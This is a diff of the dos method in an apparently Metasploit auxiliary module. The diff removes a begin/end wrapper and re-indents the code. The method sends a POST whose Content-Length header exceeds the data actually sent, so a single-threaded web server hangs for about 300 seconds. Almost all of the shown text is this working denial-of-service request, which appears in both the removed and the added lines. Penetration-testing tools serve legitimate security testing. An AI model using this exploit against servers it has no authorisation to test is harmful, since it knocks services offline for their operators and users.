@@ -41,28 +41,26 @@ class MetasploitModule < Msf::Auxiliary
   def dos
     # The web server is single threaded, and when the content length is longer than the data, it will continue to wait
     # for the rest of the data, which never comes, and times out after ~300 seconds.
-    begin
-      data = Rex::Text.rand_text_alphanumeric(40)
-      send_request_cgi({
-        'method' => 'POST',
-        'uri'    => '/',
-        'data'   => data, #'asdasdasdasdasdasdasd',
-        'headers' => {
-          # These are kept here since they were in the original exploit, however they are not required
-          #'Host' => 'asdasdasd',
-          #'User-Agent' => 'asdasdasd',
-          #'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-          #'Accept-Language' => 'en-US,en;q=0.5',
-          #'Referer' => 'asdasdasdasd',
-          #'Connection' => 'close',
-          #'Upgrade-Insecure-Requests' => 1,
-          #'Content-Type' => 'application/x-www-form-urlencoded',
-          'Content-Length' => data.length + rand(10) + 10 #42
-          }
-        })
+    data = Rex::Text.rand_text_alphanumeric(40)
+    send_request_cgi({
+      'method' => 'POST',
+      'uri'    => '/',
+      'data'   => data, #'asdasdasdasdasdasdasd',
+      'headers' => {
+        # These are kept here since they were in the original exploit, however they are not required
+        #'Host' => 'asdasdasd',
+        #'User-Agent' => 'asdasdasd',
+        #'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        #'Accept-Language' => 'en-US,en;q=0.5',
+        #'Referer' => 'asdasdasdasd',
+        #'Connection' => 'close',
+         #'Upgrade-Insecure-Requests' => 1,
+        #'Content-Type' => 'application/x-www-form-urlencoded',
+        'Content-Length' => data.length + rand(10) + 10 #42
+        }
+      })
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE
       print_error("Couldn't connect to #{peer}")
-    end
   end
 
   def run
